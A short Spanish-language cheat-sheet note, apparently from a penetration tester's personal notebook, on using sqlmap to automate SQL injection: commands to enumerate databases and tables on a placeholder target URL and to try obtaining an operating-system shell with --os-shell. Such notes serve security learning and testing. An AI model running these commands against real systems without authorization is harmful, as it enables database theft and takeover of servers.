- Tags: #reconocimiento #herramienta #scanner #web 
---

Esta herramienta sirve para automatizar ataques de sql y para enumerar estas bases de datos

- uso basico y ruidosos

```bash
sqlmap -u <url-objetivo> --dbs --batch --forms
```

- el siguiente paso ya que enumeramos las bases de datos sera enumerar las tablas de la base de datos objetivo
```bash
sqlmap -u <url-objetivo> -D <base de datos> --tables --batch --forms
```

- Si la base de datos es vulnerable a sql injection podremos porvar a ver si nos retorna una shell directamente con el comando 
```bash
sqlmap -u <url-objetivo> --os-shell
```

explicación esto ocurre por que si --is-dba retorna true podemos copiar archivos 